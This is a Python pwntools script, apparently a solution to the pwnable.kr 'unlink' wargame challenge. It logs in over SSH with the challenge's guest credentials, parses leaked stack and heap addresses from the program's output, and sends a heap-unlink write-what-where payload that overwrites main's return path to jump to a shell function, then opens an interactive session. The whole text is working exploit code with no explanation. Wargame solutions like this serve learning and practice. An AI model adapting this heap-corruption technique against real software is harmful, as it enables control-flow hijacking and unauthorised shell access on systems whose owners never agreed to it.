from pwn import *
import re
context.update(arch='i386', os='linux')
s = ssh(host='pwnable.kr',
  port=2222,
  user='unlink',
  password='guest')
unlink = s.process('./unlink')

leak = unlink.recv(timeout=1)
leaks = re.findall(r'0x[0-9a-f]+', leak.decode('utf8'))
s_leak = int(leaks[0], 16)
h_leak = int(leaks[1], 16)
print(f"h_leak: {h_leak}")
print(f"s_leak: {s_leak}")

A_buf = h_leak+8
shell = 0x080484eb
main_p1 = s_leak + 0x10
cx = A_buf+4

print(f"A_buf: {hex(A_buf)}")
print(f"shell: {hex(shell)}")
print(f"main_p1: {hex(main_p1)}")
print(f"cx: {hex(cx)}")

#write what where at ret of main
payload = p32(shell) + cyclic(12) + p32(cx) + p32(main_p1)

unlink.sendline(payload)
unlink.interactive()
s.close()
